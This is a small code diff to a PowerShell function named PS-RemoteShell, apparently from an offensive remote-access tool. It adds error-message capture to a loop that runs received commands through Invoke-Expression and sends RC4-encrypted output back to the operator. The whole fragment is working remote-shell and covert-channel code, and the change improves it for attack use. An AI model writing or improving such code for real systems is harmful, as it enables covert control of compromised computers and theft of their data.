@@ -93,6 +93,9 @@ function PS-RemoteShell {
 			$exec = (Invoke-Expression -Command $cmd 2>&1 | Out-String )
 			$data = ""
 			$exec  = $exec + "`n"
+			$errorMessage = ($error[0] | Out-String)
+			$error.clear()
+			$exec = $exec + $errorMessage
 			
 			$sendBytes = ([text.encoding]::ASCII).GetBytes($exec) + $promptUrl
 			$sendData = ($sendBytes | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
